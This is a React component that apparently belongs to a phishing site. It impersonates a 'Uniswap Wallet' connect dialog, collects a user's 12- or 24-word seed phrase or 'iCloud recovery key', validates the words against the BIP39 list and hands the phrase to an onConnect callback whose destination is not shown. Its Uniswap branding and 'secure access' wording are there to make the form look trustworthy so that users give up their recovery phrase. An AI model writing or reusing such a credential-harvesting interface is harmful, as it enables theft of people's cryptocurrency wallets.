'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';



export default function UniswapWalletModal({ onClose, onConnect, onBack }) {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [useIcloud, setUseIcloud] = useState(false);
  const [importMode, setImportMode] = useState('phrase');
  const [words, setWords] = useState(Array(12).fill(''));
  const [wordCount, setWordCount] = useState(12);
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.toLowerCase().trim();
    const invalid = new Set(invalidWords);

    if (updated[index] && !isValidBip39Word(updated[index])) {
      invalid.add(index);
    } else {
      invalid.delete(index);
    }

    setWords(updated);
    setInvalidWords(invalid);
  };

  const switchWordCount = (count) => {
    setWordCount(count);
    setWords(Array(count).fill(''));
    setInvalidWords(new Set());
  };

  const handleConnect = () => {
    if (importMode === 'phrase') {
      const filledWords = words.filter(Boolean);
      const allValid = filledWords.length === wordCount && invalidWords.size === 0;
      if (!allValid) return;
      onConnect('Uniswap Wallet', words.join(' '));
    } else {
      const phrase = seedPhrase.trim();
      if (!phrase) return;
      onConnect('Uniswap Wallet', phrase);
    }
    onClose();
  };

  const filledCount = words.filter(Boolean).length;
  const isPhraseValid = importMode === 'phrase' ? filledCount === wordCount && invalidWords.size === 0 : seedPhrase.trim().length > 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 560 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {onBack && (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          )}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Uniswap Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <img src="/icons/uniswap-uni-icon.svg" alt="Uniswap Wallet" style={{ width: 64, height: 64, margin: '0 auto 16px', display: 'block' }} />
            <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.6 }}>
              Connect your Uniswap Wallet with a recovery phrase or use iCloud backup for secure access.
            </p>
          </div>

          <div style={{ display: 'flex', justifyContent: 'center', gap: 12, marginBottom: 20, flexWrap: 'wrap' }}>
            <button
              type="button"
              onClick={() => setImportMode('phrase')}
              style={{
                padding: '10px 16px', borderRadius: 999, border: importMode === 'phrase' ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                background: importMode === 'phrase' ? 'rgba(56,189,248,0.1)' : 'transparent', color: 'var(--text)', cursor: 'pointer',
                minWidth: 140,
              }}
            >
              Seed Phrase
            </button>
            <button
              type="button"
              onClick={() => setImportMode('icloud')}
              style={{
                padding: '10px 16px', borderRadius: 999, border: importMode === 'icloud' ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                background: importMode === 'icloud' ? 'rgba(56,189,248,0.1)' : 'transparent', color: 'var(--text)', cursor: 'pointer',
                minWidth: 140,
              }}
            >
              iCloud Backup
            </button>
          </div>

          {importMode === 'phrase' ? (
            <>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: 10, marginBottom: 20, maxHeight: 360, overflowY: 'auto', paddingRight: 4 }}>
                {words.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ width: 24, textAlign: 'right', color: 'var(--text-dim)', fontSize: 13 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '10px 12px',
                        borderRadius: 12,
                        border: `1px solid ${invalidWords.has(index) ? '#ff6b6b' : 'rgba(255,255,255,0.15)'}`,
                        background: 'rgba(255,255,255,0.03)',
                        color: 'var(--text)',
                        outline: 'none',
                      }}
                    />
                  </div>
                ))}
              </div>
              <div style={{ display: 'flex', gap: 12, justifyContent: 'center', marginBottom: 20, flexWrap: 'wrap' }}>
                <button
                  type="button"
                  onClick={() => switchWordCount(12)}
                  style={{
                    padding: '10px 20px', borderRadius: 999, border: wordCount === 12 ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                    background: wordCount === 12 ? 'rgba(56,189,248,0.1)' : 'transparent', color: 'var(--text)', cursor: 'pointer',
                    minWidth: 110,
                  }}
                >
                  12 words
                </button>
                <button
                  type="button"
                  onClick={() => switchWordCount(24)}
                  style={{
                    padding: '10px 20px', borderRadius: 999, border: wordCount === 24 ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                    background: wordCount === 24 ? 'rgba(56,189,248,0.1)' : 'transparent', color: 'var(--text)', cursor: 'pointer',
                    minWidth: 110,
                  }}
                >
                  24 words
                </button>
              </div>
              <div style={{ marginBottom: 20, color: 'var(--text-dim)', fontSize: 13, textAlign: 'center' }}>
                {filledCount === wordCount && invalidWords.size === 0 ? 'Ready to connect.' : `Fill all ${wordCount} words with valid BIP39 entries.`}
              </div>
            </>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14, marginBottom: 24 }}>
              <label style={{ display: 'flex', flexDirection: 'column', gap: 8, color: 'var(--text-dim)', fontSize: 14 }}>
                iCloud Backup Key
                <input
                  type="text"
                  placeholder="Enter iCloud recovery key"
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '12px',
                    borderRadius: 12,
                    border: '1px solid rgba(255,255,255,0.15)',
                    background: 'rgba(255,255,255,0.03)',
                    color: 'var(--text)',
                    outline: 'none',
                  }}
                />
              </label>
              <div style={{ color: 'var(--text-dim)', fontSize: 13, textAlign: 'center' }}>
                Use the recovery key from your Uniswap Wallet iCloud backup to restore your account.
              </div>
            </div>
          )}

          <button
            type="button"
            onClick={handleConnect}
            disabled={!isPhraseValid}
            style={{
              width: '100%',
              padding: '14px',
              borderRadius: 12,
              border: 'none',
              background: isPhraseValid ? 'var(--cyan)' : 'rgba(255,255,255,0.12)',
              color: isPhraseValid ? 'var(--bg)' : 'var(--text-dim)',
              cursor: isPhraseValid ? 'pointer' : 'not-allowed',
              fontWeight: 700,
            }}
          >
            Connect Uniswap Wallet
          </button>
        </div>
      </div>
    </div>
  );
}
